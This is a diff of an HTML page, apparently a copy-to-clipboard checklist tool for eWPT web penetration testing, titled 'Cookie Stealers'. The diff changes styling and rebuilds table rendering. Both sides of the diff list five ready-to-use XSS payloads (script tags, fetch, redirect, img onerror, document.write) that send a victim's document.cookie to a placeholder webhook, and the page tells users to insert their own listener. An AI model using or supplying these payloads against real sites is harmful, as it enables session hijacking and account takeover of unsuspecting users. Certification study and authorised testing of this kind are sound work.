@@ -5,14 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cookie Stealers - eWPT</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a00; color: #e0e0e0; margin: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #1a1a00; color: #e0e0e0; margin: 20px; }
         .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ffd700; padding-bottom: 10px; }
         h2 { color: #ffd700; margin: 0; }
         table { width: 100%; border-collapse: collapse; background-color: #262600; margin-top: 20px; table-layout: fixed; }
         th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; word-wrap: break-word; }
         th { background-color: #333300; color: #ffd700; position: sticky; top: 0; }
         tr:hover { background-color: #3d3d00; }
-        .payload-code { font-family: 'Courier New', monospace; color: #fff176; background: #1a1a00; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; }
+        .payload-code { font-family: 'Courier New', monospace; color: #fff176; background: #1a1a00; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; white-space: pre-wrap; }
         button { background-color: #ffd700; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; min-width: 80px; }
         .reset-btn { background-color: #ff5555; color: white; }
         input[type="text"] { width: 95%; background: #333300; border: 1px solid #555; color: #fff; padding: 6px; }
@@ -25,14 +25,14 @@
         <h2>🍪 Cookie Stealing Payloads</h2>
         <button class="reset-btn" onclick="resetForm()">Clear All</button>
     </div>
-    <p>Replace <b>YOUR-WEBHOOK-URL</b> with your listener. Payloads are Base64 encoded for stability.</p>
+    <p>Replace <b>YOUR-WEBHOOK-URL</b> with your listener. All 5 payloads should now load correctly.</p>
 
     <table id="payloadTable">
         <thead>
             <tr>
                 <th style="width: 30px;">#</th>
-                <th style="width: 40%;">Payload</th>
-                <th style="width: 25%;">Description</th>
+                <th style="width: 45%;">Payload</th>
+                <th style="width: 20%;">Description</th>
                 <th style="width: 100px;">Action</th>
                 <th class="checkbox-col">Done</th>
                 <th>Notes</th>
@@ -43,72 +43,60 @@
 
     <script>
         const payloads = [
-            { 
-                id: 1, 
-                p: "<script>new Image().src='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", 
-                d: "Basic Image Tag: Stealthy background request." 
-            },
-            { 
-                id: 2, 
-                p: "<script>window.location='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", 
-                d: "Redirect: High visibility, high reliability." 
-            },
-            { 
-                id: 3, 
-                p: "<script>fetch('https://YOUR-WEBHOOK-URL?c='+document.cookie);<\/script>", 
-                d: "Fetch API: Modern async background request." 
-            },
-            { 
-                id: 4, 
-                p: "<img src=x onerror=\"this.src='https://YOUR-WEBHOOK-URL?c='+document.cookie\">", 
-                d: "Event Handler: Works if <script> is blocked." 
-            },
-            { 
-                id: 5, 
-                p: "<script>document.write('<img src=\"https://YOUR-WEBHOOK-URL?c=' + document.cookie + '\" />');<\/script>", 
-                d: "Document Write: DOM injection method." 
-            }
+            { id: 1, p: "<script>new Image().src='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Basic Image Tag" },
+            { id: 2, p: "<script>window.location='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Redirect Method" },
+            { id: 3, p: "<script>fetch('https://YOUR-WEBHOOK-URL?c='+document.cookie);<\/script>", d: "Fetch API (Async)" },
+            { id: 4, p: "<img src=x onerror=\"this.src='https://YOUR-WEBHOOK-URL?c='+document.cookie\">", d: "Event Handler Bypass" },
+            { id: 5, p: "<script>document.write('<img src=\"https://YOUR-WEBHOOK-URL?c=' + document.cookie + '\" />');<\/script>", d: "DOM Write Injection" }
         ];
 
         const tableBody = document.getElementById('tableBody');
 
         payloads.forEach(item => {
-            const b64 = btoa(item.p);
             const row = document.createElement('tr');
             
-            // Using textContent for the code block to prevent HTML injection in the tool itself
-            row.innerHTML = `
-                <td>${item.id}</td>
-                <td><span class="payload-code">${escapeHTML(item.p)}</span></td>
-                <td>${item.d}</td>
-                <td><button class="copy-btn">Copy</button></td>
-                <td class="checkbox-col"><input type="checkbox" class="task-check"></td>
-                <td><input type="text" class="task-note" placeholder="Log status..."></td>
-            `;
+            // Create cells manually to ensure character safety
+            const tdNum = document.createElement('td'); tdNum.textContent = item.id;
+            
+            const tdPayload = document.createElement('td');
+            const codeSpan = document.createElement('span');
+            codeSpan.className = 'payload-code';
+            codeSpan.textContent = item.p; // Safely renders < > " '
+            tdPayload.appendChild(codeSpan);
+            
+            const tdDesc = document.createElement('td'); tdDesc.textContent = item.d;
+            
+            const tdAction = document.createElement('td');
+            const btn = document.createElement('button');
+            btn.textContent = 'Copy';
+            btn.onclick = () => {
+                navigator.clipboard.writeText(item.p);
+                btn.textContent = 'Copied!';
+                btn.style.backgroundColor = '#fff';
+                setTimeout(() => { 
+                    btn.textContent = 'Copy'; 
+                    btn.style.backgroundColor = '#ffd700';
+                }, 800);
+            };
+            tdAction.appendChild(btn);
 
-            // Attach the click event directly to the button element in this row
-            row.querySelector('.copy-btn').addEventListener('click', function(e) {
-                copyText(item.p, e.target);
-            });
+            const tdCheck = document.createElement('td');
+            tdCheck.className = 'checkbox-col';
+            tdCheck.innerHTML = '<input type="checkbox" class="task-check">';
+
+            const tdNote = document.createElement('td');
+            tdNote.innerHTML = '<input type="text" class="task-note">';
+
+            // Append all to row
+            row.appendChild(tdNum);
+            row.appendChild(tdPayload);
+            row.appendChild(tdDesc);
+            row.appendChild(tdAction);
+            row.appendChild(tdCheck);
+            row.appendChild(tdNote);
 
             tableBody.appendChild(row);
         });
-
-        function escapeHTML(str) {
-            return str.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[m]));
-        }
-
-        function copyText(text, btn) {
-            navigator.clipboard.writeText(text).then(() => {
-                const oldText = btn.innerText;
-                btn.innerText = 'Copied!';
-                btn.style.backgroundColor = '#ffffff';
-                setTimeout(() => { 
-                    btn.innerText = oldText; 
-                    btn.style.backgroundColor = '#ffd700';
-                }, 800);
-            });
-        }
 
         function resetForm() {
             if(confirm("Clear progress?")) {
